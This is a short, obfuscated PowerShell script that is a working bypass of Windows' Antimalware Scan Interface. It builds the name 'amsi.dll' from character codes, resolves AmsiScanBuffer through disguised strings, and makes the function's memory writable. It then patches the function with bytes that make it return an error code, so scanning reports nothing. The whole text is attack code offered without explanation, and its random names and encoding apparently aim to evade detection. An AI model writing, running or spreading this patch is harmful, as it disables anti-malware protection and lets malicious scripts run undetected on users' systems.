$lGZu5Pg = @"
using System;
using System.Runtime.InteropServices;
public class lGZu5Pg {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr whUHwK1byPgYnPrPV3K0, string VlkarbvT77I_SUiBT);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr qTjtNLpenLdM3, UIntPtr XSFFEOEVbRNtDTn, uint lVEtaV, out uint NWcyYx0scuVQsCEbLfgN);
}
"@

Add-Type $lGZu5Pg

$WgWbiine_YZVXVhPIRd = [lGZu5Pg]::LoadLibrary("$([ChAR](97)+[char]([ByTE]0x6d)+[ChAr]([bYTe]0x73)+[CHAr]([bYte]0x69)+[CHAR](46+16-16)+[cHAr]([bYTe]0x64)+[Char]([BYtE]0x6c)+[cHAR](108*31/31))")
$J4TUF = [lGZu5Pg]::GetProcAddress($WgWbiine_YZVXVhPIRd, "$(('ÂmsîS'+'cànBù'+'ffér').noRMALize([chAR](42+28)+[cHAr](92+19)+[chaR]([byte]0x72)+[ChAR](54+55)+[ChAr]([bYTE]0x44)) -replace [cHAR](92+64-64)+[CHAr]([ByTE]0x70)+[CHAR]([bytE]0x7b)+[ChAr](77*46/46)+[char](110+18-18)+[CHaR]([Byte]0x7d))")
$p = 0
[lGZu5Pg]::VirtualProtect($J4TUF, [uint32]5, 0x40, [ref]$p)
$VsttG8Cai0ckN6i = "0xB8"
$BegHwVkgOiH0 = "0x57"
$uMsEdbY = "0x00"
$wBjGpE1e = "0x07"
$Eh3gj48 = "0x80"
$BA4cj = "0xC3"
$IUji0Rc_APL = [Byte[]] ($VsttG8Cai0ckN6i,$BegHwVkgOiH0,$uMsEdbY,$wBjGpE1e,+$Eh3gj48,+$BA4cj)
[System.Runtime.InteropServices.Marshal]::Copy($IUji0Rc_APL, 0, $J4TUF, 6)